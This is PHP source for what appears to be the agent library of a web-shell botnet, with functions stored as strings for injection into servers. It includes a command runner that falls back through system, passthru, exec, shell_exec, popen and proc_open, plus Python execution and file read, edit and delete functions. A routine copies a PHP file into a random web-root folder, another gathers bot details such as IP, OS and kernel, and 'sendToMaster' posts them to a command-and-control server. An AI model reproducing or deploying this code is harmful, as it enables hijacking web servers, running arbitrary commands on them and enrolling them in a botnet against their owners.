<?php
$functions = array();
$functions['decrypteObject'] = '
   
   function decrypteObject($objectStringCrypted , $key , $hash){     
   $key = substr($key, 0, 32);
   $iv_size = 16;
   $iv = substr( $hash, 0, $iv_size);
   $ciphertext_dec = base64_decode($objectStringCrypted);
   $iv_dec = substr($ciphertext_dec, 0, $iv_size);
   $ciphertext_dec = substr($ciphertext_dec, $iv_size);
   $plaintext_dec = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key,$ciphertext_dec, MCRYPT_MODE_CBC, $iv_dec);
   return $plaintext_dec ;
}
';
$functions['fileCurl'] = '
function fileCurl($url){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}
';
$functions['randKey']= 'function randKey ($lenght = 32 ){

        $abc = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM.,/!@#$%^&*()_{};:`~";
        $name ="";
        for ($i=0; $i <$lenght ; $i++) { 
            $name.=$abc[rand(0,strlen($abc)-1)];
        }
        return $name;
    }';
$functions['unzipFile']= '
function unzipFile($path , $name ){

        $reelPath = $path.DIRECTORY_SEPARATOR.$name;
        /*$extPath = $path.DIRECTORY_SEPARATOR.basename($name);
        if(file_exists($extPath)){
              $reelPath = $path.DIRECTORY_SEPARATOR."(1)".$name;
        }*/
        $zip = new ZipArchive;
        $res = $zip->open($reelPath);
        if ($res === TRUE) {
            $zip->extractTo($path);
             $zip->close();
            return true ;
        }
        else {
            return false ;
        }
    }';
$functions['delTree']= 'function delTree($dir) {
   $files = array_diff(scandir($dir), array(\'.\',\'..\'));
    foreach ($files as $file) {
      (is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file");
    }
    return rmdir($dir);
  } ';
$functions['execCmd'] = '
function execCmd($cmd){
    if(function_exists("system")) 
    {@ob_start();@system($cmd);$hfp = @ob_get_contents();$hfp = @ob_get_contents();@ob_end_clean();
    return $hfp;} 
    elseif(function_exists("
    	passthru")){@ob_start();@passthru($cmd);$hfp = @ob_get_contents();@ob_end_clean();return $hfp;} 
    elseif(function_exists("exec")) {@exec($cmd,$results);$hfp = "";foreach($results as $result){$hfp .= $result;} return $hfp;} 
    elseif(function_exists("shell_exec")){$hfp = @shell_exec($cmd);return $hfp;}
    elseif(function_exists("popen")){$fp = popen($cmd, "r"); $hfp = fread($fp, 1024); pclose($fp); return $hfp;}
    elseif(function_exists("proc_open")){$proc=proc_open($cmd, array(array("pipe","r"), array("pipe","w"),array("pipe","w") ),
    $pipes);return stream_get_contents($pipes[1]);}
    else{
        return false ;
    }
    }
';
$functions['getOs'] ='
function getOs(){
    if(strtoupper(substr(PHP_OS, 0, 3)) === "WIN"){
        return "WIN" ;
    }
    else if(strtoupper(substr(PHP_OS, 0, 5)) === "LUNIX") {

        return "LUNIX";
    }
    else {
        $os = explode(" ",PHP_OS);
        return  $os[0];
    }
}';
$functions['fileContent'] = '
	function fileContent($path){
    $resp =  array();
    if(file_exists($path)){
        if(is_readable($path)){
            $resp["status"] = true ;
            $resp["data"] = base64_encode(@file_get_contents($path));
            $resp["write"] = is_writable($path);
            return $resp;

        }
        else {
            $resp["status"] = false ;
            $resp["error"] = "Can\'t read file ";
            return $resp ;

        }

    }
    else {

        $resp["status"] = false ;
        $resp["error"] = "File Doesn\'t exict  ";
        return $resp ;
    }
}
';
$functions['editFile']= '
	function editFile($path , $contenu){
    if(!file_exists($path) || !is_writable($path)){
        return false ;
    }
    else {
        @unlink($path);
        @file_put_contents($path, $contenu);
        return true ;
    }

}
';
$functions['mkFile']='function mkFile($path){
	@file_put_contents($path, "" , FILE_APPEND);
	return true;
}';
$functions['makeDir'] = '
	function makeDir($path){
	if(is_dir($path)){
		return false;
	}
	else {
		return @mkdir($path, 0777, true);

	}
}
';
$functions['getCn'] = '
	function getCn(){
    $query = @unserialize(fileCurl("http://ip-api.com/php/"));
    $cn = strtolower($query["countryCode"]);
    return $cn ;
}
';
$functions['randName'] = '
function randName ($lenght = 12 ){
	$abc = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";
	$name ="";
	for ($i=0; $i <$lenght ; $i++) { 
		$name.=$abc[rand(0,strlen($abc)-1)];
	}
	return $name;
}
';
$functions['change'] = '
function change( $old ,  $path = NULL ){
	GLOBAL $_SERVER  ;
	if(!isset($path)){
	$path = $_SERVER["DOCUMENT_ROOT"];
	}
	$files = array_diff(scandir($path), array(\'..\', \'.\'));
	$dirs = array();
	foreach ($files as $file) {
		if(@is_dir($path.DIRECTORY_SEPARATOR.$file)){
			array_push($dirs, $path.DIRECTORY_SEPARATOR.$file);
		}
	}
	if(count($dirs)==0){
		$turn = array();
		$name = randName().".php";
		$data = file_get_contents($old);
		file_put_contents($path.DIRECTORY_SEPARATOR.$name ,$data);
		$newpath =  $path.DIRECTORY_SEPARATOR.$name;
		$newpath = "http://".$_SERVER["HTTP_HOST"].str_replace($_SERVER["DOCUMENT_ROOT"], "", $newpath);
		$turn["link"] = $newpath;
		$turn["path"] = $path.DIRECTORY_SEPARATOR.$name;
		echo json_encode($turn);


	}
	else {
		change($old , $dirs[rand(0,count($dirs)-1)]);
	}
	
}';
$functions['HostData'] = '
function HostData(  $path = NULL ){
    GLOBAL $_SERVER , $_POST  ;
    if(!isset($path)){
    $path = $_SERVER["DOCUMENT_ROOT"];
    }
    $files = array_diff(scandir($path), array(\'..\', \'.\'));
    $dirs = array();
    foreach ($files as $file) {
        if(@is_dir($path.DIRECTORY_SEPARATOR.$file)){
            array_push($dirs, $path.DIRECTORY_SEPARATOR.$file);
        }
    }
    if(count($dirs)==0){
        $data = $_POST["data"];
        $name = randName();
        file_put_contents($path.DIRECTORY_SEPARATOR.$name ,$data);
        $newpath =  $path.DIRECTORY_SEPARATOR.$name;
        $newpath = "http://".$_SERVER["HTTP_HOST"].str_replace($_SERVER["DOCUMENT_ROOT"], "", $newpath);
        echo $newpath;


    }
    else {
        HostData($dirs[rand(0,count($dirs)-1)]);
    }
    
}';
$functions['zipFile'] = '
function zipFile($path , $name ){


    $source = $path ;
    $destination = realpath($path.DIRECTORY_SEPARATOR."..").DIRECTORY_SEPARATOR.$name.".zip";
     if (!extension_loaded(\'zip\') || !file_exists($source)) {
        return false;
    }

    $zip = new ZipArchive();
    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) {
        return false;
    }

    $source = str_replace(\'\\\', \'/\', realpath($source));

    if (is_dir($source) === true)
    {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

        foreach ($files as $file)
        {
            $file = str_replace(\'\\\', \'/\', $file);

            // Ignore "." and ".." folders
            if( in_array(substr($file, strrpos($file, \'/\')+1), array(\'.\', \'..\')) )
                continue;

            $file = realpath($file);

            if (is_dir($file) === true)
            {
                $zip->addEmptyDir(str_replace($source . \'/\', \'\', $file . \'/\'));
            }
            else if (is_file($file) === true)
            {
                $zip->addFromString(str_replace($source . \'/\', \'\', $file), file_get_contents($file));
            }
        }
    }
    else if (is_file($source) === true)
    {
        $zip->addFromString(basename($source), file_get_contents($source));
    }

    return $zip->close();
}

';
$functions['getPathFiles'] = '
 function getPathFiles($path = NULL ){
    if(!isset($path)) $path = $_SERVER["DOCUMENT_ROOT"];
    if(!is_dir($path)){ return false ;}
    else{
        
        $Myfiles = array();
        $Myfiles["name"] = realpath($path );
        $Myfiles["files"] = array();
        $dirFiles = array();
        $files = scandir($path);
        foreach ($files as $file) {
            if($file ==="." || $file === ".."){

            }
            else {
            $fileDetails = array();
            $fileDetails["name"] = $file ;
            $fileDetails["size"] = filesize($path."/".$file) ;
            $fileDetails["perm"] = substr(sprintf("%o", fileperms($Myfiles["name"]."/".$file )), -4);
            if(is_dir($path."/".$file)){
                $fileDetails["type"] = 1 ;
            }else {
                $fileDetails["type"] = 0 ;

            }
            $fileDetails["mtime"] = date ("Y-m-d H:i:s", filemtime($Myfiles["name"]."/".$file ));
            $fileDetails["read"] = is_readable($Myfiles["name"]."/".$file);
            array_push($dirFiles, $fileDetails);

            }
            


        }
        $Myfiles["files"] = $dirFiles ;
        return $Myfiles  ;
    }

}
';
$functions['execPython'] = '
function execPython($python){
    file_put_contents("tst.py", $python);
    @chmod("tst.py", 0777);
    $data =  execCmd("python tst.py");
   return $data;
}
';
$functions['checkPython'] = '

function checkPython(){
    $string ="print \'tst\'";
    file_put_contents("tst.py", $string);
    @chmod("tst.py", 0777);
    $data =  execCmd("python tst.py");
    @unlink("tst.py");
    if(strlen($data)>0){
    	return true ;
    }
    else {
    	return false;
    }
}
';
$functions['ping'] = '
	function ping($ip , $port = 80){
    $starttime = microtime(true);
    $file      = @fsockopen ($ip, $port, $errno, $errstr, 10);
    $stoptime  = microtime(true);
    $status    = 0;

    if (!$file) $status = -1; 
    else {
        fclose($file);
        $status = ($stoptime - $starttime) * 1000;
        $status = floor($status);
    }
    return $status;
}
';
$functions['getBotDetails'] = '
function getBotDetails(){
	$details =  array();
if(strlen($_SERVER["HTTP_HOST"]) != 0)$domaine =  $_SERVER["HTTP_HOST"];
else $domaine = $_SERVER["SERVER_NAME"] ;

if(strlen($_SERVER["SERVER_ADDR"]) != 0)$ip =  $_SERVER["SERVER_ADDR"];
else{
    $host= gethostname();
    $ip = gethostbyname($host);

 }	
 	$http = "http://";
    if(isset($_SERVER["HTTPS"]))$http = "https://";
 	$domaine = $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
    $path = $http.$domaine;
 	 
 	 $kv = explode(" ",php_uname("")) ;
     $kv = $kv[count($kv)-1];
	 $details["domaine"] = $_SERVER["HTTP_HOST"] ;
	 $details["ip"] = $ip;
	 $details["link"] = $path;
	 $details["cn"] = getCn();
	 $details["path"] = $_SERVER["SCRIPT_FILENAME"];
	 $details["os"] = getOs();
	 $details["php"] = PHP_VERSION;
	 $details["python"] = checkPython();
	 $details["kernel"] = substr($kv, 0,5);;
	 $details["socket"] = function_exists("fsockopen");
	 $details["cmd"] = (strlen(execCmd("ls"))+strlen(execCmd("DIR"))>0);
	 return $details;
}	
';
$functions['sendToMaster']= '
function sendToMaster($data , $MASTERLINK   ){
    $content = json_encode($data);
    $curl = curl_init($MASTERLINK."?action=DECLARE");
    curl_setopt($curl, CURLOPT_HEADER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_HTTPHEADER,array("Content-type: application/json"));
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $content);
    $response = curl_exec($curl);  
    curl_close($curl);
    return $response; 
}
';
?>